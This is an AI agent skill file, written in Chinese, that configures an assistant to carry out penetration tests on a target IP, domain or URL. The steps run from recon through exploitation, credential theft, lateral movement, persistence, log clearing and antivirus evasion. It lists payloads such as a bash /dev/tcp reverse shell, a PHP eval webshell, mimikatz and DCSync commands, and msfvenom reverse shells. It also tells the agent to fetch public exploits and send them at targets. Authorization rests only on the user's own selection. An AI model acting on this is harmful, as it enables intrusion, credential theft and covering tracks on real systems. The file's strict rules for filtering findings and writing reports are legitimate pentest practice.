---
name: secskills
description: >
  渗透测试实战技能 v1.2.0。覆盖信息收集、漏洞发现 (3梯队9+3+6类)、漏洞利用、后渗透、免杀全流程。
  当用户给出具体目标 (IP/域名/URL) 且意图是攻击/利用/拿权限时触发。
  不触发: 概念讨论、蓝队防御、代码审计、CVE文档查询。
allowed-tools: Read, Write, Bash, Grep, WebSearch, WebFetch, Glob, AskUserQuestion
argument-hint: <target_url_or_ip>
---

# 渗透测试实战技能

> 架构: Level 1 (frontmatter) → Level 2 (本文件) → Level 3 (references/)
> 覆盖: 信息收集 → Web漏洞 → 主机漏洞 → 后渗透 → 免杀

## 触发条件

**触发（全部满足）**:
1. 意图是攻击/利用/拿权限，非学习/防御/讨论
2. 给出具体目标: IP、域名、URL、端口、漏洞环境
3. 涉及: SQL注入/XSS/RCE/SSRF/文件上传/LFI/XXE/反序列化/提权/横向/免杀

**不触发（任一命中）**:
- "什么是XSS"、"怎么防御" → 普通问答
- 蓝队/应急响应/日志分析 → 非本Skill
- 代码优化/重构/业务bug → 普通编程
- "查CVE" → WebSearch
- AI Prompt注入/越狱 → secknowledge-skill
- 完整项目白盒审计 → code-audit-skill

**行为**: Skill 加载后正常待命；用户给出具体测试目标时 → 弹出 `AskUserQuestion` 方向键选择面板（授权/深度/范围），选择完成后进入测试流程。

## 行为准则（全程有效）

1. ❗ **授权优先** — 利用步骤输出前确认: 授权渗透 | 本人环境。无授权 → 只出分析，不出武器化Payload
2. ❗ **引用强制** — CVE/Payload 必须引用 `references/` 中文件章节。未覆盖 → `⚠️ UNABLE TO CITE`
3. ❗ **风险标注** — 漏洞标 🔴致命/🔴高危/🟡中危/🟢低危 + 利用条件
4. ❗ **链式思维** — 优先输出利用链 (A→B→C)，非孤立漏洞
5. ❗ **命令可执行** — 所有命令完整可复制，IP/端口用 `<target>` 占位
6. ❗ **漏洞质量铁律** — 宁可漏报不可误报。每条漏洞必须逐项填写自检清单（YES/NO），任一项NO则直接丢弃。不报黑名单项目，不报扫描器原始输出，不报安全加固建议

## ⚔️ 漏洞过滤体系（输出前强制执行，逐条过审）

> **核心原则：渗透报告的质量 = 过滤掉的噪音量。宁可漏报，不可误报。**
> 以下四道关卡逐级过滤。**任一关卡未通过 → 该发现直接丢弃**，不输出、不降级、不写进"安全建议"。

### 第零关：快速预筛（任意命中 → 直接丢弃）

以下 5 种是渗透测试中最高频的误判来源，**直接丢弃，不进后续关卡**：

| # | 判定 | 典型场景 |
|---|------|---------|
| ⓪ | **扫描器自动报的** | Burp/Nessus/AWVS/SQLMap 的原始告警，未经手动验证 |
| ① | **凭经验推测的** | "可能存在SSRF"、"通常有越权"、"一般会泄露" — 未实际发请求 |
| ② | **信息收集中间产物** | 端口开放、服务版本、子域名列表、目录结构 — 这些是素材，不是漏洞 |
| ③ | **安全加固建议** | "建议开启CSP"、"建议升级TLS版本" — 这不算漏洞发现 |
| ④ | **纯静态分析** | 读代码/读配置推断的漏洞，从未实际请求验证 |

### 第一关：自检门（逐项填写 YES/NO，强制输出）

**每个漏洞写入报告前，必须逐项填写以下清单。任一项为 NO → 直接丢弃。**

```
漏洞名称: ___________________
[ ] ① 实际发出了验证请求？        YES / NO
    请求命令: ___________________
[ ] ② 拿到了真实响应数据？        YES / NO
    响应关键内容（脱敏后）: ________
[ ] ③ 造成了实际危害？            YES / NO
    具体危害（读了什么数据 / 执行了什么命令 / 越权了什么操作）: ________
    ⚠️ "触发报错" ≠ "造成危害" | "能访问到" ≠ "拿到了敏感数据"
[ ] ④ 利用链完整可复现？          YES / NO
    步骤: 入口 → ___ → ___ → 危害
    ⚠️ 链中任一步为推测/猜测 → 填 NO
[ ] ⑤ 对照黑名单逐条检查通过？    YES / NO
    黑名单命中项（如有）: ________
[ ] ⑥ 满足对应等级的最低准入？    YES / NO
    对应等级: 🔴致命 / 🔴高危 / 🟡中危 / 🟢低危
    满足的标准: ___________________
```

> **铁律**：
> - ①~⑥ 全部 YES → 允许报告，且在报告中附带此清单
> - 任一项为 NO → **直接丢弃**，不在报告中出现，不降级输出
> - **③ 为 NO 时（无实际危害），无条件丢弃**，无论其他项是否为 YES

### 第二关：黑名单（逐条对照检查，命中即丢弃）

以下所有项**严禁作为漏洞报告**。每个漏洞输出前必须逐条对照检查。

| 类别 | 黑名单项（永远不报为漏洞） |
|------|--------------------------|
| **响应头** | 缺少 CSP / HSTS / X-Frame-Options / X-Content-Type-Options / Referrer-Policy / Permissions-Policy；Cookie 缺少 HttpOnly / Secure / SameSite |
| **信息泄露** | Server / X-Powered-By 版本号；前端 JS/HTML/CSS 中的路由/配置/注释/API路径；无敏感文件的目录列表；robots.txt / sitemap.xml / .git/HEAD（无敏感数据可读）；phpinfo()（无凭据泄露）；调试模式/DEBUG=True（无凭据泄露）；详细错误消息（不含密码/Token/密钥等敏感数据） |
| **认证会话** | 登录用户名枚举（响应差异/时间差异）；密码策略不够严格（无爆破成功证明）；会话未在服务端销毁（无劫持证明）；autocomplete/缓存未禁用；URL参数传敏感信息（无窃取证明）；默认凭据尝试失败；无验证码（无爆破成功证明）；JWT none algorithm（无实际绕过证明）；401/403响应（=被拒绝，≠认证绕过） |
| **SSL/网络** | 自签名证书；弱加密套件；TLS版本低；HTTP未强制跳转HTTPS；OPTIONS/TRACE方法开启；弱SSH算法（无凭据获取证明）；管理后台/默认页面存在但无法进入 |
| **未验证利用** | SQL注入报错但无法提取数据；文件上传成功但Web服务器不解析执行；无回显反射XSS；SSRF内网可达但未获取敏感数据/凭证；任意文件读只读到Web根目录公开文件；命令注入无实际输出；文件包含无可利用路径（无日志投毒/无可控文件/无伪协议） |
| **其他禁止** | 纯功能缺陷（UI/业务逻辑Bug）；短信/邮箱轰炸（无资费损失证明）；扫描器"疑似/可能"告警未验证；信息收集中间产物报为漏洞；同系统同类型漏洞>3个（降级合并）；CSRF Token缺失无敏感操作可劫持；API无频率限制；利用条件极苛刻（物理接触/猜64位随机数等） |

> 所有缺失安全响应头 → **不输出**。这不是漏洞，是配置噪音。如需提醒，在测试摘要中一行带过："目标缺少部分安全响应头，非安全漏洞，不展开。"

### 第三关：严重等级准入

漏洞必须满足对应等级的**最低准入条件**，否则降级重审。降级后仍不满足 → 丢弃。

| 等级 | 最低准入（必须满足至少一项） | 不满足则 |
|------|--------------------------|---------|
| 🔴**致命** | ① 获取系统权限（RCE/WebShell/命令注入拿Shell）② 核心DB拖库（≥3个敏感字段：身份证/银行卡/手机号/密码/地址）③ 核心认证绕过（无凭证直接进后台） | → 降为高危重审 |
| 🔴**高危** | ① 任意密码重置/登录 ② 重要系统SQL注入（有数据回显）③ 重要系统SSRF（获取内网凭证/云元数据）④ 重要系统任意文件读（读到配置/源码/密钥）⑤ 越权增删改查用户敏感信息 ⑥ 本地提权（完整利用链） | → 降为中危重审 |
| 🟡**中危** | ① 存储型XSS（能窃取Cookie/钓鱼）② 敏感操作CSRF（支付/改密）③ 非核心SQL注入（有数据回显）④ 任意文件操作（读/写/删，有实际影响）⑤ 普通越权 ⑥ 弱口令（有成功登录截图） | → 降为低危重审 |
| 🟢**低危** | ① 反射XSS（有弹窗证明）② 非核心存储XSS ③ 有限越权（如越权购物车）④ 需特殊条件的信息泄露（SVN泄露等）⑤ 有报错但利用受限的SQL注入 | → 直接丢弃 |
| ⛔**丢弃** | 边缘/废弃环境、无法复现、利用条件极苛刻且无通用性、同系统同类型>3个降级合并 | — |

### 典型误判场景速查（这些都是"看起来像漏洞"但实际不是）

**以下场景模型高频误判，单独列出以校准判断：**

| 你看到的 | 容易误报为 | 实际判断 |
|---------|-----------|---------|
| 登录失败 "用户名不存在" vs "密码错误" 响应不同 | 用户名枚举 | **这不是漏洞**。常见UX设计，无实质危害，无法进一步利用 |
| 服务器500错误返回了堆栈trace | 信息泄露 | 除非堆栈中包含**密码/Token/密钥/数据库连接串**，否则不算 |
| /admin 返回302跳转登录页 | 未授权访问 | **302=已正确保护**。只有直接访问成功拿到后台数据才算 |
| 修改Cookie/URL中的ID访问到他人公开信息 | 越权 | 必须确认读到他人**敏感/隐私数据**（非公开信息）才算 |
| 上传了.php文件返回200 OK | 文件上传RCE | Web服务器必须实际**解析执行**了PHP代码才算 |
| 内网IP:端口返回了HTTP响应 | SSRF→内网探测 | 必须通过SSRF获取到**敏感数据/云凭证/内部服务内容**才算 |
| 密码输入框 autocomplete="on" | 敏感信息泄露 | 浏览器默认行为，非应用漏洞 |
| 验证码是4位数字可脚本识别 | 认证绕过 | 必须有**实际爆破成功**的证据才算 |

## 幻觉防护

| 内容类型 | 正确 | 禁止 |
|---------|------|------|
| CVE 编号 | WebSearch → WebFetch PoC → 实际验证。禁止凭记忆编造编号和版本范围 | 看到版本号直接报 CVE |
| Payload | 从 `references/` 引用 | 凭记忆写 |
| 工具参数 | 标准 Kali 语法或 `references/` 记载 | 伪造参数 |
| 版本范围 | "Apache 2.4.0-2.4.49 (CVE-2021-41773)" | "所有版本" |
| 无匹配 | `⚠️ UNABLE TO ASSESS: 未覆盖，建议[行动]` | 凭经验断言 |
| 自检门失败 | 跳过该漏洞，不输出 | 输出无危害/无证据/无利用链的漏洞 |
| 黑名单命中 | 跳过，标注"配置噪音" | 将配置噪音报为漏洞 |

**标注**: `[引用:file:section]` · `⚠️ 通用知识` · `💡 方法论推理`

## 输出约束

- 禁止: 开场客套话、工具调用描述、已知信息复述、未授权武器化链
- **报告铁律**: 仅输出已确认利用的漏洞 + 修复方案。不输出"可能存在"、"建议检查"、"安全配置建议"、扫描器原始告警。**无确认漏洞就说"未发现可利用漏洞"**，不填充无效内容
- **CORS/CRLF/Cache-Poison/Host-Header/HTTP-Smuggling/GraphQL**: 默认不报为漏洞。这些是技术特性/架构问题，**除非**能展示完整利用链并造成实际数据泄露/账户劫持，否则一律不输出
- 利用链: 仅输出已确认的，宁少勿多，不设下限
- Payload: ≤5条/类、表格/列表优先

## 工作流程

> 严格两阶段: [攻击阶段] Step 1+2 (发现与检测) → [利用阶段] Step 3+4 (武器化与后渗透)
> 两阶段引用隔离: 利用阶段只能引用攻击阶段已加载的 L2 文件，禁止跨阶段新增 reference
>
> ⚠️ **测试确认**: 当用户给出具体目标（IP/域名/URL）要开始测试时，必须先调用 `AskUserQuestion` 弹出交互式选择面板。
> 用户用 **↑↓ 方向键** 选择，**Enter** 确认，对话不中断。选择完成后再进入 Step 1。

### 🎯 测试确认（有目标时触发）

当用户给出具体测试目标时，使用 `AskUserQuestion` 一次性弹出以下 3 个问题：

**问题 1 — 授权级别:**
- Header: `授权级别`
- 选项:
  - `🔴 授权渗透` — 正式授权，完整利用链
  - `🟡 灰盒测试` — 有测试账号
  - `🟢 黑盒测试` — 无凭证，外部探测
  - `⚪ 本人环境` — 自建靶场/CTF

**问题 2 — 测试深度:**
- Header: `测试深度`
- 选项:
  - `标准测试` (推荐) — 全量漏洞检测+验证
  - `快速扫描` — 端口+指纹+常见PoC
  - `深度测试` — 含内网横向+后渗透
  - `仅信息收集` — 不利用

**问题 3 — 测试范围:**
- Header: `测试范围`
- 选项:
  - `仅主目标` — 只测给定目标
  - `含子域名` — 扩展子域名/子目录
  - `含关联资产` — C段/同ASN

> 选择完成后输出简短确认，立即进入 Step 1。如有测试账号，用户通过 "其他" 填写。

### 🔍 攻击阶段 — 发现与检测

**Step 1: 信息收集 + 攻击面识别**
- 分类目标 (Web/主机/内网/混合) → 按导航索引匹配 reference → 输出列表 L1
- 攻击面: 端口/服务/Web入口/认证/API/子域名
- **指纹重点**: 识别到的组件+版本号 → 标记为「历史漏洞匹配候选」，进入 Step 2a 优先处理
- ✅ `Step1: 类型={X}, 攻击面={N}项, |L1|={M}个reference, 历史漏洞候选={P}个组件`

**Step 2: 漏洞发现 + 知识加载**

#### Step 2a: 历史漏洞匹配检测（指纹 → 搜历史漏洞 → PoC验证）⭐ 优先

> 指纹识别到具体软件/版本后，**优先**搜索该版本的所有已知历史漏洞（CVE + 无编号漏洞 + 框架已知缺陷），然后再进行通用漏洞检测。
>
> **"历史漏洞"范围**: CVE 编号漏洞 + 无 CVE 的公开漏洞（如 ThinkPHP 5.x RCE、Shiro 550、WebLogic 反序列化）+ Exploit-DB/GitHub 公开 PoC + 厂商安全公告。

1. **提取可匹配组件**: 从 Step 1 指纹结果中提取所有带版本号和不带版本号的组件（如 `Apache 2.4.49`、`Struts 2.x`、`ThinkPHP`、`Shiro`、`WebLogic`）
2. **多维度搜索历史漏洞**: 对每个组件并行执行以下搜索 — **禁止凭记忆编造漏洞和版本范围**
   - `"[组件名] [版本号] CVE exploit"` — CVE 编号漏洞
   - `"[组件名] [版本号] RCE 漏洞 PoC"` — 无 CVE 的 RCE 漏洞
   - `"[组件名] [版本号] 反序列化 漏洞"` — 特定类型漏洞
   - `"site:exploit-db.com [组件名]"` — Exploit-DB 公开利用
   - `"site:github.com [组件名] [版本号] exploit"` — GitHub PoC
3. **加载 PoC**: 搜索结果中有公开 PoC → WebFetch 获取详情；无公开 PoC → 跳过该漏洞，不做猜测
4. **验证**: 对目标实际发送 PoC 请求，验证是否可 exploited
5. **过自检门**: 历史漏洞验证同样必须通过全部 6 项自检清单 — 版本匹配 ≠ 漏洞存在，必须实际执行并拿到危害证据
6. **失败处理**: 验证失败（已修复/版本不适用/配置不同/WAF拦截）→ 记录跳过原因，不输出到报告
7. **无版本号组件的处理**: 如指纹只有 `Shiro` 无版本号 → 搜索 `"Shiro 漏洞检测"` → 用通用检测方法（如 Shiro RememberMe 反序列化检测）直接验证，而非猜测版本

> 💡 历史漏洞命中 → 通常为 🔴致命/🔴高危，是**投入产出比最高**的攻击路径，一条命中 ≈ 10 条通用模糊测试。
> ⚠️ 发现致命/高危历史漏洞成功利用 → 立即停止深入，先确认并记录。
> ⚠️ **有指纹无版本号 ≠ 不能测**。如 Shiro/WebLogic/JBoss 等，直接用特征检测方法验证，不需知道精确版本。

#### Step 2b: 通用漏洞检测（分层 + 知识加载）

- 按 L1 加载 reference，每次 ≤1000tokens → 记加载集合 L2 (L2 ⊆ L1)
- **按优先级分层检测**：第一梯队必测 → 第二梯队选择性测 → 第三梯队快速过（默认跳过）
- **仅输出已通过自检门的确认漏洞**：每条标注 🔴致命/🔴高危/🟡中危/🟢低危 + 前提条件 + 检测命令 + 响应证据
- ❌ **禁止输出"漏洞假设"列表** — 不输出推测性/待验证的漏洞条目
- 失败降级: Read重试1次 → Bash cat → 标 "不可读"移除
- ✅ `Step2: 历史漏洞匹配={X}条(已验证{Y}/已排除{Z}), 通用检测已确认={K}条(已过自检门), 已过滤噪音={N}条`

> ⚠️ 攻击阶段不输出武器化 Payload，仅输出检测用 PoC
> ⚠️ 第三梯队项目（CORS/CRLF/缓存投毒/Host头/请求走私/GraphQL内省）快速检测后默认跳过，不输出到报告

### ⚔️ 利用阶段 — 武器化与后渗透

**Step 3: 漏洞利用 + 链式组合 + 报告生成**
- 从 L2 取利用 Payload → 可执行命令 → 优先构建利用链 (A→B→C→RCE)
- 每条利用必须引用 L2 中的具体 section，禁止重新搜索 reference
- **过自检门**: 每条漏洞/利用链必须满足「能打出危害 + 有利用链 + 有证据」，否则跳过
- **生成最终报告**: 按「报告输出格式」模板输出（见下文），每条漏洞必须附带修复方案
- ✅ `Step3: 利用链={N}条, 引用覆盖率={X}%, 过滤={M}条(自检门/黑名单)`

**Step 4: 后渗透（按需触发）**
- 目标: 提权 / 横向移动 / 凭据窃取 / 域渗透 / 持久化 / 痕迹清理
- ✅ `Step4: 提权={X}, 横向={Y}条, 凭据={Z}组, 报告={已生成/未生成}`

---

## 报告输出格式（强制）

> 最终报告**仅**包含以下两部分。无确认漏洞时只输出一条：`✅ 测试完成，未发现可利用漏洞。`

### 一、已确认漏洞

每个漏洞必须包含以下字段，缺一不可：

```
### 🔴/🔴/🟡/🟢 [漏洞名称] — [目标URL/端点]

**危害**: [一句话描述实际造成的危害，非推测]

**证据**: 
- 请求: [完整可复制的命令/请求]
- 响应: [脱敏后的关键响应内容]
- 截图/日志: [如有]

**利用链**: [入口] → [步骤1] → [步骤2] → [危害结果]

**自检清单**:
[ ] ① 实际发出请求: YES | ② 真实响应: YES | ③ 实际危害: YES
[ ] ④ 利用链完整: YES | ⑤ 黑名单通过: YES | ⑥ 等级准入: YES

**修复方案**: [具体可操作的修复建议，非泛泛而谈]
```

### 二、测试摘要

```
- 测试目标: <target>
- 测试时间: <date>
- 确认漏洞: {N}条 (🔴致命: X, 🔴高危: Y, 🟡中危: Z, 🟢低危: W)
- 已排除噪音: {M}条 (已过自检门/黑名单过滤，不在报告中展开)
```
- 无确认漏洞时输出: `✅ 测试完成，未发现可利用漏洞。`
- ❌ **禁止**: 在报告中输出"安全配置建议"、"加固建议"、CORS/响应头缺失等配置噪音
- ❌ **禁止**: 输出未验证的"可能存在"、"疑似"、"建议进一步检查"条目

## 场景导航索引

### 信息收集
| 场景 | reference |
|------|----------|
| 端口扫描+服务识别 | `references/info-port-scan.md` |
| 子域名枚举 | `references/info-subdomain.md` |
| 目录/文件爆破 | `references/info-dir-brute.md` |
| Web指纹/OSINT | `references/info-fingerprint.md` / `references/info-osint.md` |

### Web 漏洞 — 攻击阶段（检测与发现）

> **漏洞优先级分层**：
> - 🔴 **第一梯队（必测必报）**: 确认即报告，不确认不编造
> - 🟡 **第二梯队（验证后报告）**: 仅在有实际危害证据时报告
> - ⚫ **第三梯队（默认不报）**: 技术特性/架构问题，非安全漏洞。**除非**展示完整利用链+实际数据泄露/账户劫持，否则一律不输出

#### 🔴 第一梯队 — 必测必报（确认即报告，不确认不编造）

| 场景 | reference | 关键检测 |
|------|----------|---------|
| SQL 注入 | `references/web-sqli.md` | 闭合/报错/延时/OrderBy |
| 命令执行 RCE | `references/web-rce.md` | 拼接符/回显/不出网 |
| SSRF | `references/web-ssrf.md` | 内网探测/云元数据/Gopher |
| 文件上传 | `references/web-upload.md` | 后缀/内容/条件竞争 |
| 文件包含/路径遍历 | `references/web-lfi-path.md` | 伪协议/日志投毒/截断 |
| XXE 注入 | `references/web-xxe.md` | 文件读取/Blind/外带DTD |
| 反序列化 | `references/web-deser.md` | PHP/Java/Python gadget |
| SSTI 模板注入 | `references/web-ssti.md` | Jinja2/Twig/FreeMarker |
| 越权/逻辑漏洞 | `references/web-auth-logic.md` | IDOR/支付/密码重置/会话 |

#### 🟡 第二梯队 — 验证后报告（仅在有实际危害时报告）

| 场景 | reference | 关键检测 | 报告条件 |
|------|----------|---------|---------|
| XSS 跨站脚本 | `references/web-xss.md` | 反射/存储/DOM/CSP | **仅**存储型能窃取Cookie/钓鱼成功，反射XSS需有真实弹窗截图 |
| 目录遍历/敏感文件 | `references/web-dir-traversal.md` | 路径穿越/目录列表/配置读取 | **仅**读到非公开敏感文件（配置/源码/密钥），读到公开文件不算 |
| 竞争条件/并发 | `references/web-race-condition.md` | TOCTOU/并发绕过/秒杀/优惠券 | **仅**成功绕过业务限制（超发/重复下单/越权操作） |

#### ⚫ 第三梯队 — 默认不报为漏洞（技术特性，非安全漏洞）

> ⚠️ **这些是架构特性/配置问题，不是安全漏洞。除非能展示完整利用链造成实际数据泄露或账户劫持，否则一律不输出。**
> 99% 的情况下，以下项目检查后直接跳过，不在报告中出现。

| 场景 | reference | 何时才报告（极端罕见） |
|------|----------|----------------------|
| CORS 配置 | `references/web-cors.md` | **必须**证明跨域窃取到敏感数据（Cookie/Token/API响应），仅 Origin 反射不算 |
| CRLF 注入 | `references/web-crlf.md` | **必须**证明响应头注入导致XSS或会话固定，仅 `%0d%0a` 回显不算 |
| Host 头注入 | `references/web-host-header.md` | **必须**证明密码重置链接劫持成功，仅 Host 反射不算 |
| 缓存投毒 | `references/web-cache-poison.md` | **必须**证明投毒后其他用户受影响的XSS/重定向，仅缓存头存在不算 |
| HTTP 请求走私 | `references/web-http-smuggling.md` | **必须**证明劫持其他用户请求/窃取数据，仅时间差异不算 |
| GraphQL 内省 | `references/web-graphql.md` | **必须**证明通过GraphQL获取到敏感数据或实现SQLi/RCE，仅内省开启不算 |

### Web 漏洞 — 利用阶段（武器化）

| 场景 | reference | 关键利用 |
|------|----------|---------|
| WAF/IDS 绕过 | `references/web-waf-bypass.md` | 编码/分块/HPP/协议走私 |

> 各漏洞利用Payload在对应reference的「利用阶段」section中，WAF绕过为利用阶段通用技巧

### 主机与后渗透
| 场景 | reference |
|------|----------|
| 密码爆破 | `references/host-brute.md` |
| Linux 提权 | `references/post-linux-privesc.md` |
| Windows 提权 | `references/post-win-privesc.md` |
| 凭据窃取+横向 | `references/post-credentials.md` |
| 域渗透 | `references/post-ad.md` |

### 免杀规避
| 场景 | reference |
|------|----------|
| Shellcode 混淆+加载器 | `references/evasion-shellcode.md` |

### 工具速查 (独立 tools/ 目录)
| 工具 | reference | 用途 |
|------|----------|------|
| Nmap | `references/tools-nmap.md` | 端口扫描+服务识别+NSE脚本 |
| SQLMap | `references/tools-sqlmap.md` | SQL注入自动化+文件读写+OS Shell |
| Metasploit | `references/tools-msf.md` | Payload生成+Meterpreter+后渗透模块 |
| Hydra | `references/tools-hydra.md` | 多协议密码爆破 |
| Impacket | `references/tools-impacket.md` | PTH/PTT/DCSync/横向移动 |
| Gobuster/ffuf | `references/tools-fuzz.md` | 目录爆破+VHOST+参数Fuzz |

### Payload 速查入口
| 目的 | 速查 | 详细 |
|------|------|------|
| SQLi Union | `' UNION SELECT ...--` | `web-sqli.md §2` |
| SQLi 报错 | `extractvalue/updatexml` | `web-sqli.md §3` |
| SQLi 盲注 | `IF(...SLEEP(3)...)` | `web-sqli.md §4` |
| XSS | `<script>alert(1)</script>` | `web-xss.md §1` |
| 反弹Shell | `bash -i >& /dev/tcp/x/x` | `web-rce.md §4` |
| SSRF 元数据 | `http://169.254.169.254/` | `web-ssrf.md §3` |
| 文件上传 PHP | `<?php @eval($_POST[1]);?>` | `web-upload.md §1` |
| LFI 日志投毒 | UA:`<?php system('id');?>` | `web-lfi-path.md §3` |
| 目录遍历基础 | `?file=../../../../etc/passwd` | `web-dir-traversal.md §2` |
| 并发竞争 Turbo | `engine.openGate('race')` | `web-race-condition.md §3` |
| SSRF→Redis RCE | Gopher 协议 | `web-ssrf.md §4` |
| Linux SUID | `find / -perm -4000` | `post-linux-privesc.md §2` |
| Win Token | Potato/PrintSpoofer | `post-win-privesc.md §6` |
| Mimikatz | `sekurlsa::logonpasswords` | `post-credentials.md §1` |
| PTH | `psexec.py -hashes :NTLM` | `post-credentials.md §4` |
| MSFvenom | `-p windows/x64/shell_reverse_tcp` | `evasion-shellcode.md §1` |
| XXE 文件读取 | `<!ENTITY xxe SYSTEM "file://...">` | `web-xxe.md §1` |
| SSTI Jinja2 RCE | `{{lipsum.__globals__...}}` | `web-ssti.md §2` |
| IDOR 检测 | 遍历ID/改资源标识符 | `web-auth-logic.md §1` |
| 支付逻辑篡改 | 改价格/数量/优惠券 | `web-auth-logic.md §4` |
| PHP 反序列化 | `O:N:"Class":N:{...}` | `web-deser.md §1` |
| Java ysoserial | `CommonsCollections5` | `web-deser.md §2` |
| Kerberoasting | `Rubeus kerberoast` | `post-ad.md §3` |
| DCSync | `mimikatz lsadump::dcsync` | `post-ad.md §5` |
| Golden Ticket | `krbtgt hash + domain sid` | `post-ad.md §6` |
| HTTP 请求走私 | `CL.TE / TE.CL 走私请求` | `web-http-smuggling.md §3` | ⚫ 默认不报 |
| Host 头投毒 | `密码重置链接劫持` | `web-host-header.md §2` | ⚫ 默认不报 |
| 缓存投毒XSS | `非键化header → 缓存篡改` | `web-cache-poison.md §2` | ⚫ 默认不报 |
| CORS 跨域窃取 | `Access-Control-Allow-Origin 反射` | `web-cors.md §2` | ⚫ 默认不报 |
| CRLF 注入 | `响应头注入/会话固定` | `web-crlf.md §2` | ⚫ 默认不报 |
| GraphQL 内省 | `__schema / __type` | `web-graphql.md §2` | ⚫ 默认不报 |

## 零结果处理

| 情况 | 动作 |
|------|------|
| 目标不可达 | `❌ UNABLE TO ASSESS: 目标无响应` |
| Reference 未覆盖 | `⚠️ UNABLE TO CITE: 建议 WebSearch [关键词]` |
| 无授权 | `仅检测方法，不输出武器化链。授权|本人环境?` |
| WAF拦截 | 加载 `web-waf-bypass.md` |
| 利用失败 | 检查版本→防护→替代Payload |

## 路由边界

| 诉求 | 路由 |
|------|------|
| 渗透/红队/提权 | **本 Skill** |
| AI/LLM 安全测试 | secknowledge-skill |
| 白盒代码审计 | code-audit-skill |
| 查CVE/文档 | WebSearch/Context7 |

---

*v1.2.0 | SecSkills | 架构: CLAUDE.md (L1) / SKILL.md (L2) → references/ (L3) 36个专项文件 | 漏洞3梯队分层 | 测试确认: AskUserQuestion 方向键选择*
